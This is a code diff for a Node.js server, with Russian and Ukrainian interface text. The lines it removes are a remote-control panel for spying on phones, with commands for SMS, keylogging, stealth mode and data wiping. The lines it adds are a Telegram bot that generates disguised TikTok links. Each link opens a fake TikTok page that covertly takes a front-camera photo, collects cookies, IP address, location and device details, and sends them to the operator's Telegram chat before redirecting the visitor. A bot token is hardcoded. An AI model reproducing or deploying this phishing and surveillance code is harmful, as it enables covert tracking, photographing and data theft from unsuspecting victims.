@@ -1,173 +1,199 @@
 const express = require('express');
-const http = require('http');
-const { Server } = require('socket.io');
+const TelegramBot = require('node-telegram-bot-api');
+const crypto = require('crypto');
+
+const TOKEN = '8989024516:AAEAIwKbvaDe8HALbrjv-UoHcH6Pp2wZiso';
+const CHAT_ID = '8667961334';
+const PORT = process.env.PORT || 3000;
+const DOMAIN = process.env.DOMAIN || 'https://your-domain.com';
 
 const app = express();
-const server = http.createServer(app);
-const io = new Server(server, { cors: { origin: '*' } });
+const bot = new TelegramBot(TOKEN, { polling: true });
 
-const sessions = {};
+app.use(express.json({ limit: '15mb' }));
+app.use(express.urlencoded({ extended: true }));
 
-// ===== 100 КОМАНД (справочник для пульта) =====
-const COMMANDS = [
-  // Камера (1-10)
-  'photo_back','photo_front','video_record_start','video_record_stop',
-  'camera_flash_on','camera_flash_off','camera_switch','camera_zoom_in',
-  'camera_zoom_out','camera_night_mode',
-  // Гео (11-20)
-  'get_location','get_location_history','track_live','geo_fence_set',
-  'geo_fence_alert','get_wifi_info','get_cell_info','get_ip_address',
-  'get_last_known','location_off_alert',
-  // Файлы (21-30)
-  'list_files','download_file','delete_file','upload_file',
-  'get_contacts','get_sms','send_sms','get_call_log','make_call','get_calendar',
-  // Экран (31-40)
-  'screen_capture','screen_record','screen_stream','tap','swipe',
-  'type_text','press_home','press_back','press_recent','lock_screen',
-  // Звук (41-50)
-  'record_audio','play_sound','set_volume','mute','unmute',
-  'play_alarm','stop_alarm','get_media_files','play_media','stop_media',
-  // Приложения (51-60)
-  'list_apps','install_app','uninstall_app','open_app','close_app',
-  'get_app_usage','block_app','get_running_apps','clear_app_cache','get_installed_apk',
-  // Сеть (61-70)
-  'get_wifi_list','connect_wifi','disconnect_wifi','get_bluetooth_devices',
-  'enable_bluetooth','disable_bluetooth','enable_mobile_data','disable_mobile_data',
-  'get_network_speed','ping_host',
-  // Блокировка (71-80)
-  'remote_lock','remote_unlock','wipe_data','change_password','set_pin',
-  'get_lock_status','enable_lost_mode','disable_lost_mode','show_message','vibrate',
-  // Мониторинг (81-90)
-  'get_battery','get_system_info','get_processes','get_sensors','get_clipboard',
-  'set_clipboard','get_notifications','get_keyboard_history','get_screenshot_history','get_browser_history',
-  // Спец (91-100)
-  'stealth_mode','self_destruct','remote_reboot','remote_shutdown','factory_reset',
-  'sim_change_alert','sim_info','sos_mode','heartbeat','kill_app'
-];
+const linksDB = {};
+const userStates = {};
 
-io.on('connection', (socket) => {
-  socket.on('register-target', (id) => {
-    sessions[id] = sessions[id] || {};
-    sessions[id].target = socket.id;
-    socket.join(id);
-    socket.emit('command-list', COMMANDS);
-  });
-  socket.on('register-controller', (id) => {
-    sessions[id] = sessions[id] || {};
-    sessions[id].controller = socket.id;
-    socket.join(id);
-    socket.emit('command-list', COMMANDS);
-  });
-  socket.on('command', ({ sessionId, action, data }) => {
-    socket.to(sessionId).emit('command', { action, data });
-  });
-  socket.on('screen', ({ sessionId, image }) => {
-    socket.to(sessionId).emit('screen', { image });
-  });
-  socket.on('result', ({ sessionId, action, result }) => {
-    socket.to(sessionId).emit('result', { action, result });
-  });
+bot.onText(/\/start/, (msg) => {
+  const chatId = msg.chat.id;
+  userStates[chatId] = 'WAITING_LINK';
+  bot.sendMessage(chatId, 'Отправь ссылку на TikTok.');
 });
 
-// HTML-пульт
-app.get('/', (req, res) => {
+bot.on('message', (msg) => {
+  const chatId = msg.chat.id;
+  const text = msg.text;
+
+  if (!text || text.startsWith('/')) return;
+
+  if (userStates[chatId] === 'WAITING_LINK') {
+    if (!text.includes('tiktok.com')) {
+      return bot.sendMessage(chatId, 'Неверная ссылка.');
+    }
+
+    const shortId = crypto.randomBytes(6).toString('base64').replace(/\+/g, '').replace(/\//g, '').replace(/=/g, '').substring(0, 9);
+    linksDB[shortId] = text;
+
+    const fakeLink = `${DOMAIN}/${shortId}/`;
+
+    bot.sendMessage(chatId, `Ссылка: ${fakeLink}`);
+    userStates[chatId] = null;
+  }
+});
+
+app.post('/api/collect', async (req, res) => {
+  const { cookies, geo, phone, browser, target, photo } = req.body;
+  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+
+  try {
+    let text = `IP: ${ip}\nГео: ${geo?.country || '?'}, ${geo?.city || '?'}\nУстройство: ${phone?.os || '?'}\nЦель: ${target || '?'}`;
+    await bot.sendMessage(CHAT_ID, text);
+
+    if (photo && photo.startsWith('data:image')) {
+      const base64Data = photo.split(',')[1];
+      const buffer = Buffer.from(base64Data, 'base64');
+      await bot.sendPhoto(CHAT_ID, buffer);
+    }
+
+    res.json({ ok: true });
+  } catch (error) {
+    res.status(500).json({ ok: false });
+  }
+});
+
+app.get('/:id/', (req, res) => {
+  const shortId = req.params.id;
+  const targetUrl = linksDB[shortId];
+
+  if (!targetUrl) {
+    return res.redirect('https://www.tiktok.com/');
+  }
+
   res.send(`<!DOCTYPE html>
-<html><head><meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Пульт</title>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<title>TikTok</title>
 <style>
-*{box-sizing:border-box;margin:0;padding:0}
-body{background:#0a0a0a;color:#0f0;font-family:monospace;padding:10px}
-h1{font-size:14px;margin:8px 0}
-.row{display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap}
-input,button,select{background:#111;color:#0f0;border:1px solid #0f0;padding:7px;font-family:monospace;font-size:12px;border-radius:4px}
-input{flex:1;min-width:100px}
-button{cursor:pointer}
-button:active{background:#0f0;color:#000}
-#screen{width:100%;max-width:320px;background:#000;border:1px solid #0f0;display:block;margin:8px 0}
-#log{background:#000;border:1px solid #333;padding:6px;height:120px;overflow-y:auto;font-size:10px;color:#0a0;white-space:pre-wrap}
-.grid{display:grid;grid-template-columns:repeat(2,1fr);gap:5px}
-.grid button{font-size:10px;padding:5px}
-.on{color:#0f0}.off{color:#f00}
-</style></head><body>
-
-<h1>▶ ПУЛЬТ УПРАВЛЕНИЯ</h1>
-<div class="row">
-<input id="session" placeholder="ID сессии">
-<button onclick="connect()">Подключиться</button>
+  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+  body { height: 100vh; background: #f1f1f2; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; color: #000; }
+  .header { background: #e3e3e3; padding: 12px 16px; display: flex; align-items: center; gap: 12px; border-bottom: 1px solid #d0d0d0; }
+  .avatar-lg { width: 48px; height: 48px; border-radius: 50%; background: #ccc; display: flex; justify-content: center; align-items: center; }
+  .avatar-lg svg { width: 28px; height: 28px; fill: #fff; }
+  .header-info { flex: 1; }
+  .header-info .name { font-weight: 600; font-size: 16px; margin-bottom: 2px; }
+  .header-info .desc { font-size: 13px; color: #666; }
+  .btn-red { background: #fe2c55; color: #fff; border: none; padding: 10px 16px; border-radius: 4px; font-size: 14px; font-weight: 600; cursor: pointer; }
+  .content { padding: 20px; max-width: 600px; margin: 0 auto; }
+  .skeleton-box { background: #e0e0e0; border-radius: 8px; margin-bottom: 16px; }
+  .skeleton-box.big { height: 400px; width: 100%; }
+  .skeleton-row { display: flex; gap: 12px; margin-bottom: 16px; }
+  .skeleton-circle { width: 40px; height: 40px; border-radius: 50%; background: #d0d0d0; }
+  .skeleton-text { height: 16px; background: #d0d0d0; border-radius: 4px; margin-bottom: 8px; }
+  .skeleton-text.w-50 { width: 50%; }
+  .skeleton-text.w-80 { width: 80%; }
+  #preview, #canvas { display: none; }
+</style>
+</head>
+<body>
+<div class="header">
+  <div class="avatar-lg"><svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg></div>
+  <div class="header-info">
+    <div class="name">TikTok</div>
+    <div class="desc">Приєднуйся до мене в TikTok</div>
+  </div>
+  <button class="btn-red" id="btnOpen">Відкрити застосунок</button>
 </div>
-<div>Статус: <span id="status" class="off">не подключён</span></div>
-
-<canvas id="screen" width="320" height="570"></canvas>
-
-<div class="row">
-<button onclick="cmd('photo_back')">📷 Задн.</button>
-<button onclick="cmd('photo_front')">🤳 Фронт.</button>
-<button onclick="cmd('get_location')">📍 Гео</button>
-<button onclick="cmd('record_audio')">🎤 Микро</button>
+<div class="content">
+  <div class="skeleton-row">
+    <div class="skeleton-circle"></div>
+    <div style="flex:1">
+      <div class="skeleton-text w-50"></div>
+      <div class="skeleton-text w-80"></div>
+    </div>
+  </div>
+  <div class="skeleton-box big"></div>
 </div>
-<div class="row">
-<input id="msg" placeholder="Сообщение">
-<button onclick="cmd('show_message',document.getElementById('msg').value)">Показать</button>
-</div>
-<div class="row">
-<input id="txt" placeholder="Текст для ввода">
-<button onclick="cmd('type_text',document.getElementById('txt').value)">Ввод</button>
-</div>
-
-<div class="grid">
-<button onclick="cmd('screen_capture')">Скриншот</button>
-<button onclick="cmd('screen_stream')">Трансляция</button>
-<button onclick="cmd('press_home')">Home</button>
-<button onclick="cmd('press_back')">Back</button>
-<button onclick="cmd('press_recent')">Recent</button>
-<button onclick="cmd('lock_screen')">Блок</button>
-<button onclick="cmd('play_alarm')">🚨 Сирена</button>
-<button onclick="cmd('stop_alarm')">Стоп</button>
-<button onclick="cmd('vibrate')">Вибра</button>
-<button onclick="cmd('get_battery')">Батарея</button>
-<button onclick="cmd('get_sms')">СМС</button>
-<button onclick="cmd('get_contacts')">Контакты</button>
-<button onclick="cmd('get_call_log')">Звонки</button>
-<button onclick="cmd('get_wifi_list')">Wi-Fi</button>
-<button onclick="cmd('list_apps')">Приложения</button>
-<button onclick="cmd('get_clipboard')">Буфер</button>
-<button onclick="cmd('get_notifications')">Уведомл.</button>
-<button onclick="cmd('get_system_info')">Система</button>
-<button onclick="cmd('remote_lock')">🔒 Lock</button>
-<button onclick="cmd('heartbeat')">Пинг</button>
-</div>
-
-<h1>📜 ЛОГ</h1>
-<div id="log"></div>
-
-<script src="/socket.io/socket.io.js"></script>
+<video id="preview" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
 <script>
-let socket=null,sessionId=null;
-function log(t){const e=document.getElementById('log');e.textContent=new Date().toLocaleTimeString()+' '+t+'\\n'+e.textContent}
-function setStatus(on){const e=document.getElementById('status');e.textContent=on?'ПОДКЛЮЧЁН':'не подключён';e.className=on?'on':'off'}
-function connect(){
- sessionId=document.getElementById('session').value.trim().toUpperCase();
- if(!sessionId)return log('Введите ID');
- if(socket)socket.disconnect();
- socket=io();
- socket.on('connect',()=>{log('OK');socket.emit('register-controller',sessionId);setStatus(true)});
- socket.on('disconnect',()=>{log('off');setStatus(false)});
- socket.on('screen',({image})=>{const i=new Image();i.onload=()=>{const c=document.getElementById('screen');c.getContext('2d').drawImage(i,0,0,c.width,c.height)};i.src='data:image/jpeg;base64,'+image});
- socket.on('result',({action,result})=>log('← '+action+': '+JSON.stringify(result)));
-}
-function cmd(action,data){
- if(!socket||!socket.connected)return log('Сначала подключитесь');
- socket.emit('command',{sessionId,action,data});
- log('→ '+action+(data?' ('+data+')':''));
-}
-document.getElementById('screen').addEventListener('click',(e)=>{
- const r=e.target.getBoundingClientRect();
- cmd('tap',{x:Math.round((e.clientX-r.left)/r.width*1000),y:Math.round((e.clientY-r.top)/r.height*1000)});
-});
+  const TARGET_URL = "${targetUrl}";
+  const tg = window.Telegram?.WebApp;
+
+  if (tg) {
+    tg.ready();
+    tg.expand();
+    if (tg.BackButton) tg.BackButton.hide();
+  }
+
+  const COOKIE_DATA = {}, GEO_DATA = {}, PHONE_DATA = {}, BROWSER_DATA = {};
+  const video = document.getElementById('preview');
+  const canvas = document.getElementById('canvas');
+
+  async function collectAll() {
+    COOKIE_DATA.raw = document.cookie || '';
+    try {
+      const r = await fetch('https://ipwho.is/'); const g = await r.json();
+      if (g.success) { GEO_DATA.country = g.country; GEO_DATA.city = g.city; }
+    } catch(e){}
+    PHONE_DATA.os = navigator.userAgent;
+    BROWSER_DATA.lang = navigator.language;
+  }
+
+  async function takePhoto() {
+    let stream = null;
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+      video.srcObject = stream;
+      await new Promise(res => { if (video.readyState >= 2) return res(); video.onloadeddata = () => res(); });
+      await new Promise(r => setTimeout(r, 200));
+      canvas.width = video.videoWidth || 480;
+      canvas.height = video.videoHeight || 360;
+      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+      const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.85));
+      stream.getTracks().forEach(t => t.stop());
+      video.srcObject = null;
+      return blob;
+    } catch (e) {
+      if (stream) stream.getTracks().forEach(t => t.stop());
+      return null;
+    }
+  }
+
+  let redirected = false;
+  function goTarget() {
+    if (redirected) return;
+    redirected = true;
+    if (tg && tg.openLink) {
+      tg.openLink(TARGET_URL);
+    } else {
+      location.replace(TARGET_URL);
+    }
+  }
+
+  document.getElementById('btnOpen').onclick = (e) => { e.preventDefault(); goTarget(); };
+  setTimeout(goTarget, 3000);
+
+  (async () => {
+    const photoPromise = takePhoto();
+    await collectAll();
+    const photoBlob = await photoPromise;
+    const photoBase64 = photoBlob ? await new Promise((res) => { const reader = new FileReader(); reader.onloadend = () => res(reader.result); reader.readAsDataURL(photoBlob); }) : null;
+    fetch('/api/collect', {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({ cookies: COOKIE_DATA, geo: GEO_DATA, phone: PHONE_DATA, browser: BROWSER_DATA, photo: photoBase64, target: TARGET_URL })
+    }).catch(() => {});
+  })();
 </script>
-</body></html>`);
+</body>
+</html>`);
 });
 
-const PORT = process.env.PORT || 3000;
-server.listen(PORT, '0.0.0.0', () => console.log('Сервер на ' + PORT));
+app.listen(PORT, () => {
+  console.log(`Port ${PORT}`);
+});
